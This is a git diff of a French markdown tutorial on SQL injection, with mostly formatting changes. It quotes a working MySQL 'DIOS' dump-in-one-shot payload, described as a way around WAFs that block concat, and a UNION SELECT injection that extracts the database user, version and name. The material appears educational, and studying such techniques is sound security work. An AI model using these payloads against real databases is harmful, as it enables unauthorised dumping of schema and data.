@@ -169,13 +169,14 @@ On peut aussi utiliser la commande ``GROUP BY``. Elle est utilisée pour grouper
 ![image](https://user-images.githubusercontent.com/74382279/159136046-84fc0649-c1a2-415a-a862-7b183d47bcd9.png)
 • A partir de 2 sélections il n'y a plus d'erreur, on peut donc utiliser ``UNION SELECT`` pour avoir notre point d'entrée.<br/>
 ![image](https://user-images.githubusercontent.com/74382279/159136155-c4f63ffb-a4d8-45bc-9f03-789b74edb976.png)
-• Si on remplace la deuxième sélection par une commande DIOS (Dump in one shot). Ce DIOS  utiliser est utilise contre les WAF qui bloquent concat.<br/>
+• Si on remplace la deuxième sélection par une commande DIOS (Dump in one shot). Ce DIOS  utiliser est utilise contre les WAF qui bloquent concat.<br/><br/>
 ```sql
 (SELECT export_set(5,@:=0,(SELECT count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
 ```
+<br/><br/>
 Si on formatte la requête ça donne ça:<br/>
-![image](https://user-images.githubusercontent.com/74382279/159136320-3bdbb668-65bc-4d2b-9354-0f686ef566b1.png)
-Grossomodo, la requête utiliser SELECT 
+![image](https://user-images.githubusercontent.com/74382279/159136320-3bdbb668-65bc-4d2b-9354-0f686ef566b1.png)<br/>
+Grossomodo, la requête utiliser SELECT<br/>
 • Maintenant si je veux afficher la version de la BDD MySQL, l'username et l'hostname de la session MySQL et le nom de la BDD. J'exécute la requête suivante:
 ```sql
 UNION SELECT NULL,CONCAT_WS(" | ",user(),version(),database())--+-
